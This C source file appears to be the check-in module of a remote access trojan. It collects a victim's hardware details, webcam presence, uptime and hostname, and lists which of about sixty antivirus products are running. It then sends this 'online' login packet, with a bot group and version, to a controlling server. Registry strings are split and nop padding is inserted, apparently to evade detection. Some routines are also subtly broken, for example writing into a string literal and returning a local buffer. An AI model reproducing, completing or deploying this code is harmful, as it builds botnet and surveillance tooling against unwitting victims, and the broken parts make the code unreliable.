#include <wininet.h>
#include <stdlib.h>
#include <vfw.h>
#include <iphlpapi.h> //网络速率头

#include "until.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "vfw32.lib")
#pragma comment ( lib, "iphlpapi.lib" ) 

DWORD CPUClockMhz()
{
	char str1[256]="~M";
	char str2[256]="Hz";
	strcat(str1,str2);

	char str3[256]="HARDWARE\\DESCRIPTION\\Sys";
	char str4[256]="tem\\CentralProcessor\\0";
	strcat(str3,str4);

	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, str3, &hKey);
	RegQueryValueEx(hKey, str1, NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}
BOOL IsWebCam()
{
	BOOL	bRet = FALSE;
	
	char	lpszName[100], lpszVer[50];
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet=capGetDriverDescription(i, lpszName, sizeof(lpszName),
			lpszVer, sizeof(lpszVer));
	}
	return bRet;
}


UINT GetHostRemark(LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024] = "SYSTEM\\Setup";
	memset(lpBuffer, 0, uSize);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);

	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);
	
	return lstrlen(lpBuffer);
}

///////////////////杀毒显示
char* GetSVirus()
{	
   char* AllName = "";									
   char* SVirusName = "360tray.exe";
   char* SVirusName1 = "avp.exe";    
   char* SVirusName2 = "KvMonXP.exe";								
   char* SVirusName3 = "RavMonD.exe";	
   char* SVirusName4 = "360sd.exe"; 
   char* SVirusName5 = "Mcshield.exe"; 							
   char* SVirusName6 = "egui.exe"; 
   char* SVirusName7 = "kxetray.exe";  
   char* SVirusName8 = "knsdtray.exe";	  				
   char* SVirusName9 = "TMBMSRV.exe";  
   char* SVirusName10 = "avcenter.exe";   
   char* SVirusName11 = "AvastSvc.exe";
   char* SVirusName12 = "AYAgent.aye";  
   char* SVirusName13 = "patray.exe";    
   char* SVirusName14 = "V3Svc.exe";
   char* SVirusName15 = "avgwdsvc.exe"; 
   char* SVirusName16 = "ccSetMgr.exe";  
   char* SVirusName17 = "ashserv.exe";
   char* SVirusName18 = "QUHLPSVC.EXE"; 
   char* SVirusName19 = "mssecess.exe";  
   char* SVirusName20 = "SavProgress.exe";
   char* SVirusName21 = "fsavgui.exe";  
   char* SVirusName22 = "vsserv.exe";     
   char* SVirusName23 = "remupd.exe"; 
   char* SVirusName24 = "TmProxy.exe";  
   char* SVirusName25 = "FortiTray.exe";  
   char* SVirusName43 = "KSafeTray.EXE";
   char* SVirusName44 = "QQPCTray.exe";  
   char* SVirusName45 = "a2guard.exe";     
   char* SVirusName46 = "ad-watch.exe";
   char* SVirusName47 = "fsav32.exe"; 
   char* SVirusName48 = "cleaner8.exe";  
   char* SVirusName49 = "vba32lder.exe";
   char* SVirusName50 = "MongoosaGUI.exe";  
   char* SVirusName51 = "CorantiControlCenter32.exe";  
   char* SVirusName52 = "F-PROT.EXE";
   char* SVirusName53 = "CMCTrayIcon.exe";  
   char* SVirusName54 = "K7TSecurity.exe";  
   char* SVirusName55 = "UnThreat.exe";
   char* SVirusName56 = "CKSoftShiedAntivirus4.exe"; 
   char* SVirusName57 = "AVWatchService.exe"; 
   char* SVirusName58 = "ArcaTasksService.exe";
   char* SVirusName59 = "iptray.exe";  
   char* SVirusName60 = "PSafeSysTray.exe"; 
   char* SVirusName61 = "nspupsvc.exe";
   char* SVirusName62 = "SpywareTerminatorShield.exe";  
   char* SVirusName63 = "BKavService.exe"; 
   char* SVirusName64 = "MsMpEng.exe"; 
   char* SVirusName65 = "SBAMSvc.exe";  
   char* SVirusName66 = "ccSvcHst.exe"; 
   char* SVirusName67 = "cfp.exe";
   char* SVirusName68 = "S.exe";
   char* SVirusName69 = "1433.exe";
   char* SVirusName70 = "DUB.exe";
   char* SVirusName71 = "FTP.exe";

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		if (GetProcessID(SVirusName)) 
	{

//		OutputDebugString( "发现360安全卫士了" );
		ZeroMemory( SVirusName, sizeof(SVirusName) );
		SVirusName = "360安全卫士";
	//	MessageBox( NULL, VirusName, "", NULL );
		lstrcat( AllName, SVirusName ); // 如果找到了进程, 就把名字加到AllName的后面
		lstrcat( AllName, " " ); // 用一个 隔开, 下面可能有别的杀软.
	}
	if (GetProcessID(SVirusName1))
	{	

		ZeroMemory( SVirusName1, sizeof(SVirusName1) );
		SVirusName1 = "卡巴斯基";
		lstrcat( AllName, SVirusName1 ); 
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName2))
	{	

		ZeroMemory( SVirusName2, sizeof(SVirusName2) );
		SVirusName2 = "江民杀毒";
		lstrcat( AllName, SVirusName2 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName3))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName3, sizeof(SVirusName3) );
		SVirusName3 = "瑞星杀毒";
		lstrcat( AllName, SVirusName3 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName4))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName4, sizeof(SVirusName4) );
		SVirusName4 = "360杀毒";
		lstrcat( AllName, SVirusName4 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName5))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName5, sizeof(SVirusName5) );
		SVirusName5 = "麦咖啡";
		lstrcat( AllName, SVirusName5 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName6))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		char UIs[] = {'N','O','D','3','2','\0'};
		ZeroMemory( SVirusName6, sizeof(SVirusName6) );
		SVirusName6 = UIs;
		lstrcat( AllName, SVirusName6 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName7))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName7, sizeof(SVirusName7) );
		SVirusName7 = "金山毒霸";
		lstrcat( AllName, SVirusName7 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName8))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName8, sizeof(SVirusName8) );
		SVirusName8 = "可牛杀毒";
		lstrcat( AllName, SVirusName8 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName9))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName9, sizeof(SVirusName9) );
		SVirusName9 = "趋势科技";
		lstrcat( AllName, SVirusName9 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName10))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName10, sizeof(SVirusName10) );
		SVirusName10 = "小红伞";
		lstrcat( AllName, SVirusName10 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName11))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		char QDdd[] = {'a','v','a','s','t','杀','毒','\0'};
		ZeroMemory( SVirusName11, sizeof(SVirusName11) );
		SVirusName11 = QDdd;
		lstrcat( AllName, SVirusName11 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName12))
	{	
		ZeroMemory( SVirusName12, sizeof(SVirusName12) );
		_asm nop;
		_asm nop;
		_asm nop;
		SVirusName12 = "韩国胶囊";
		_asm nop;
		_asm nop;
		_asm nop;
		lstrcat( AllName, SVirusName12 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(SVirusName13))
	{	
		ZeroMemory( SVirusName13, sizeof(SVirusName13) );
		_asm nop;
		_asm nop;
		_asm nop;
		SVirusName13 = "安博士";
		_asm nop;
		_asm nop;
		_asm nop;
		lstrcat( AllName, SVirusName13 );
		lstrcat( AllName, " " );
	}
 	if (GetProcessID(SVirusName14))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName14, sizeof(SVirusName14) );
		SVirusName14 = "安博士V3";
		lstrcat( AllName, SVirusName14 );
		lstrcat( AllName, " " );
	}
  	if (GetProcessID(SVirusName15))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName15, sizeof(SVirusName15) );
		SVirusName15 = "AVG杀毒";
		lstrcat( AllName, SVirusName15 );
		lstrcat( AllName, " " );
	}
  	if (GetProcessID(SVirusName16))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName16, sizeof(SVirusName16) );
		SVirusName16 = "赛门铁克";
		lstrcat( AllName, SVirusName16 );
		lstrcat( AllName, " " );
	}
  	if (GetProcessID(SVirusName17))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName17, sizeof(SVirusName17) );
		SVirusName17 = "Avast反病毒";
		lstrcat( AllName, SVirusName17 );
		lstrcat( AllName, " " );
	}
  	if (GetProcessID(SVirusName18))
	{	
		_asm nop;
		_asm nop;
		_asm nop;
		ZeroMemory( SVirusName18, sizeof(SVirusName18) );
		SVirusName18 = "QUICK HEAL杀毒";
		lstrcat( AllName, SVirusName18 );
		lstrcat( AllName, " " );
	}
        if (GetProcessID(SVirusName19))
	{	
			_asm nop;
			_asm nop;
		_asm nop;
		ZeroMemory( SVirusName19, sizeof(SVirusName19) );
		SVirusName19 = "微软杀毒";
		lstrcat( AllName, SVirusName19 );
		lstrcat( AllName, " " );
	}
        if (GetProcessID(SVirusName20))
	{	
			_asm nop;
			_asm nop;
		_asm nop;
		ZeroMemory( SVirusName20, sizeof(SVirusName20) );
		SVirusName20 = "Sophos杀毒";
		lstrcat( AllName, SVirusName20 );
		lstrcat( AllName, " " );
	}
        if (GetProcessID(SVirusName21))
	{	
			_asm nop;
			_asm nop;
		_asm nop;
		char tsfy[] = {'F','-','S','e','c','u','r','e','杀','毒','\0'};
		ZeroMemory( SVirusName21, sizeof(SVirusName21) );
		SVirusName21 = tsfy;
		lstrcat( AllName, SVirusName21 );
		lstrcat( AllName, " " );
	}
        if (GetProcessID(SVirusName22))
	{	
			_asm nop;
			_asm nop;
		_asm nop;
		ZeroMemory( SVirusName22, sizeof(SVirusName22) );
		SVirusName22 = "比特梵德";
		lstrcat( AllName, SVirusName22 );
		lstrcat( AllName, " " );
	}
        if (GetProcessID(SVirusName23))
	{	
			_asm nop;
			_asm nop;
		_asm nop;
		ZeroMemory( SVirusName23, sizeof(SVirusName23) );
		SVirusName23 = "熊猫卫士";
		lstrcat( AllName, SVirusName23 );
		lstrcat( AllName, " " );
	}
        if (GetProcessID(SVirusName24))
	{	
			_asm nop;
			_asm nop;
		_asm nop;
		ZeroMemory( SVirusName24, sizeof(SVirusName24) );
		SVirusName24 = "趋势科技";
		lstrcat( AllName, SVirusName24 );
		lstrcat( AllName, " " );
	}
        if (GetProcessID(SVirusName25))
	{	
			_asm nop;
			_asm nop;
		_asm nop;
		ZeroMemory( SVirusName25, sizeof(SVirusName25) );
		SVirusName25 = "飞塔";
		lstrcat( AllName, SVirusName25 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName43))
	{	
		ZeroMemory( SVirusName43, sizeof(SVirusName43) );
		SVirusName43 = "金山卫士";
		lstrcat( AllName, SVirusName43 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName44))
	{	
		ZeroMemory( SVirusName44, sizeof(SVirusName44) );
		SVirusName44 = "QQ电脑管家";
		lstrcat( AllName, SVirusName44 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName45))
	{	
		ZeroMemory( SVirusName45, sizeof(SVirusName45) );
		SVirusName45 = "a-squared杀毒";
		lstrcat( AllName, SVirusName45 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName46))
	{	
		ZeroMemory( SVirusName46, sizeof(SVirusName46) );
		SVirusName46 = "Lavasoft杀毒";
		lstrcat( AllName, SVirusName46 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName47))
	{	
		char tfy[] = {'F','-','S','e','c','u','r','e','杀','毒','\0'};
		ZeroMemory( SVirusName47, sizeof(SVirusName47) );
		SVirusName47 = tfy;
		lstrcat( AllName, SVirusName47 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName48))
	{	
		ZeroMemory( SVirusName48, sizeof(SVirusName48) );
		SVirusName48 = "The Cleaner杀毒";
		lstrcat( AllName, SVirusName48 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName49))
	{	
		ZeroMemory( SVirusName49, sizeof(SVirusName49) );
		SVirusName49 = "vb32杀毒";
		lstrcat( AllName, SVirusName49 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName50))
	{	
		ZeroMemory( SVirusName50, sizeof(SVirusName50) );
		SVirusName50 = "Mongoosa杀毒";
		lstrcat( AllName, SVirusName50 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName51))
	{	
		ZeroMemory( SVirusName51, sizeof(SVirusName51) );
		SVirusName51 = "Coranti2012杀毒";
		lstrcat( AllName, SVirusName51 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName52))
	{	
		ZeroMemory( SVirusName52, sizeof(SVirusName52) );
		SVirusName52 = "F-PROT杀毒";
		lstrcat( AllName, SVirusName52 );
		lstrcat( AllName, " " );
	}

	if(GetProcessID(SVirusName53))
	{	
		ZeroMemory( SVirusName53, sizeof(SVirusName53) );
		SVirusName53 = "CMC杀毒";
		lstrcat( AllName, SVirusName53 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName54))
	{	
		ZeroMemory( SVirusName54, sizeof(SVirusName54) );
		SVirusName54 = "K7杀毒";
		lstrcat( AllName, SVirusName54 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName55))
	{	
		ZeroMemory( SVirusName55, sizeof(SVirusName55) );
		SVirusName55 = "UnThreat杀毒";
		lstrcat( AllName, SVirusName55 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName56))
	{	
		ZeroMemory( SVirusName56, sizeof(SVirusName56) );
		SVirusName56 = "Shield Antivirus杀毒";
		lstrcat( AllName, SVirusName56 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName57))
	{	
		ZeroMemory( SVirusName57, sizeof(SVirusName57) );
		SVirusName57 = "VIRUSfighter杀毒";
		lstrcat( AllName, SVirusName57 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName58))
	{	
		ZeroMemory( SVirusName58, sizeof(SVirusName58) );
		SVirusName58 = "ArcaVir杀毒";
		lstrcat( AllName, SVirusName58 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName59))
	{	
		ZeroMemory( SVirusName59, sizeof(SVirusName59) );
		SVirusName59 = "Immunet杀毒";
		lstrcat( AllName, SVirusName59 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName60))
	{	
		ZeroMemory( SVirusName60, sizeof(SVirusName60) );
		SVirusName60 = "PSafe杀毒";
		lstrcat( AllName, SVirusName60 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName61))
	{	
		ZeroMemory( SVirusName61, sizeof(SVirusName61) );
		SVirusName61 = "nProtect杀毒";
		lstrcat( AllName, SVirusName61 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName62))
	{	
		ZeroMemory( SVirusName62, sizeof(SVirusName62) );
		SVirusName62 = "SpywareTerminator杀毒";
		lstrcat( AllName, SVirusName62 );
		lstrcat( AllName, " " );
	}
	
	if(GetProcessID(SVirusName63))
	{	
		ZeroMemory( SVirusName63, sizeof(SVirusName63) );
		SVirusName63 = "Bkav杀毒";
		lstrcat( AllName, SVirusName63 );
		lstrcat( AllName, " " );
	}

	if (GetProcessID(SVirusName64))
	{	
		ZeroMemory( SVirusName64, sizeof(SVirusName64) );
		SVirusName64 = "Microsoft Security Essentials";
		lstrcat( AllName, SVirusName64 );
		lstrcat( AllName, " " );
	}

	if (GetProcessID(SVirusName65))
	{	
		ZeroMemory( SVirusName65, sizeof(SVirusName65) );
		SVirusName65 = "VIPRE";
		lstrcat( AllName, SVirusName65 );
		lstrcat( AllName, " " );
	}
	
	if (GetProcessID(SVirusName66))
	{	
		ZeroMemory( SVirusName66, sizeof(SVirusName66) );
		SVirusName66 = "Norton杀毒";
		lstrcat( AllName, SVirusName66 );
		lstrcat( AllName, " " );
	}

    if (GetProcessID(SVirusName67))
	{	
		ZeroMemory( SVirusName67, sizeof(SVirusName67) );
		SVirusName67 = "COMODO";
		lstrcat( AllName, SVirusName67 );
		lstrcat( AllName, " " );
	}
	
	    if (GetProcessID(SVirusName68))
	{	
		ZeroMemory( SVirusName68, sizeof(SVirusName68) );
		SVirusName67 = "在抓鸡";
		lstrcat( AllName, SVirusName68 );
		lstrcat( AllName, " " );
	}

		    if (GetProcessID(SVirusName69))
	{	
		ZeroMemory( SVirusName69, sizeof(SVirusName69) );
		SVirusName69 = "在扫1433";
		lstrcat( AllName, SVirusName69 );
		lstrcat( AllName, " " );
	}
			    if (GetProcessID(SVirusName70))
	{	
		ZeroMemory( SVirusName70, sizeof(SVirusName70) );
		SVirusName70 = "在爆破";
		lstrcat( AllName, SVirusName70 );
		lstrcat( AllName, " " );
	}
			    if (GetProcessID(SVirusName71))
	{	
		ZeroMemory( SVirusName71, sizeof(SVirusName71) );
		SVirusName71 = "发现FTP";
		lstrcat( AllName, SVirusName71 );
		lstrcat( AllName, " " );
	}

	if (strstr(AllName, " " )  == 0 )
	{	
		lstrcat(AllName , "暂未发现");

	}

	return AllName;
}

char*  GetInfo(LPCTSTR lpKeyName, LPCTSTR lpServiceName)
{
	char	strValue[1024]={0};
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	
	if(!ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, lpKeyName, REG_SZ, (char *)strValue, NULL, 1024, 0))
		return "";
	return	strValue;
}

extern MODIFY_DATA modify_data;

UINT GetGroupName(LPTSTR lpBuffer, UINT uSize)
{	
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	
	//wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	wsprintf(strSubKey,"%s%s%s%s", "SYST", "EM\\CurrentContro", "lSet\\Services\\", "BITS");
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, modify_data.szGetGroup , REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	
	return lstrlen(lpBuffer);
}

int GetNetwork()//获取网络速率Mbps 
{
	DWORD dwSize = 0;
	DWORD dwRetVal = 0;
	DWORD speed = 0; 
    DWORD dwspeed = 0;
	MIB_IFTABLE *pIfTable;
	MIB_IFROW *pIfRow;
	
	pIfTable = (MIB_IFTABLE *) malloc(sizeof (MIB_IFTABLE));
	if (pIfTable == NULL) 
	{
		return 1;
	}
	dwSize = sizeof (MIB_IFTABLE);
	if (GetIfTable(pIfTable, &dwSize, FALSE) == ERROR_INSUFFICIENT_BUFFER) 
	{
		free( pIfTable);
		pIfTable = (MIB_IFTABLE *) malloc(dwSize);
		if (pIfTable == NULL) 
		{
			return 1;
		}
	}
	if ((dwRetVal = GetIfTable(pIfTable, &dwSize, FALSE)) == NO_ERROR) 
	{        
		pIfRow = (MIB_IFROW *) & pIfTable->table[0];
		speed = pIfRow->dwSpeed;
		dwspeed = speed/1000/1000; //mbps        
	} 
	if (pIfTable != NULL) 
	{
		free(pIfTable);
		pIfTable = NULL;
	}
	
	return dwspeed;
}

int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
{
	int nRet = SOCKET_ERROR;
	// 登录信息
	LOGININFO	LoginInfo;
	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录
	LoginInfo.bIsWebCam = 0; //没有摄像头
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // 注意转换类型

	// 主机名
	char hostname[256];
	GetHostRemark(hostname, sizeof(hostname));

	// 连接的IP地址
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);


	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));
	// CPU
	LoginInfo.dwCPUClockMhz = CPUClockMhz();
	SYSTEM_INFO SysInfo;//用于获取CPU个数的
	GetSystemInfo(&SysInfo);
	LoginInfo.nCPUNumber = SysInfo.dwNumberOfProcessors;
	
	//内存大小
    MEMORYSTATUS    MemInfo; 
    MemInfo.dwLength=sizeof(MemInfo); 
    GlobalMemoryStatus(&MemInfo);
	LoginInfo.MemSize = MemInfo.dwTotalPhys/1024/1024;

	//摄像头
	LoginInfo.bIsWebCam = IsWebCam();

	// Speed
	LoginInfo.Speed = dwSpeed;

	// Speed
	LoginInfo.dwSpeed = GetNetwork();

    // 杀毒软件
	strcpy( LoginInfo.SVirus, GetSVirus() );

	//开机时间
	long t=GetTickCount();
	char day[100];
	char hour[100];
	char min[100];
	wsprintf(day, "%d", t/86400000);
	t%=86400000;
	wsprintf(hour, "%d", t/3600000);
	t%=3600000;
	wsprintf(min, "%d", t/60000);
    wsprintf(LoginInfo.RunTime, "%s天%s小时%s分钟", day, hour, min);

	//上线版本
	strcpy(LoginInfo.szVersion, MyDecode(modify_data.szVersion));

	// 上线分组
	char	*UpRow = NULL;
	char Group[256];
	char strWirn2[] = {'D','e','f','a','u','l','t','\0'};
	if(GetGroupName(Group, sizeof(Group))==0)
	{
		if(modify_data.szGroup != NULL)
		{
			UpRow = (char *)(MyDecode(modify_data.szGroup));
		}
		else
		{
			UpRow = strWirn2;
		}
	}
	else
	{
		UpRow=Group;
	}
	strcpy(LoginInfo.UpGroup,UpRow);

	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));

	return nRet;
}
